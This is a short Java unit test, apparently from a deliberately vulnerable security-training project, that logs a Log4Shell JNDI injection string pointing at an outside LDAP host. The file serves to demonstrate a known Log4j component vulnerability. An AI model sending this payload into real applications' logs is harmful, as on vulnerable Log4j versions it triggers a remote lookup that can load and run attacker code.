package org.bewhale.javasec.controller.componentsvul;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.Test;

class Log4jTest {
    private static final Logger logger = LogManager.getLogger(Log4j.class);

    @Test
    void log4j() {
        logger.error("${jndi:ldap://jndi.fuzz.red:5/0ml5/}");
    }
}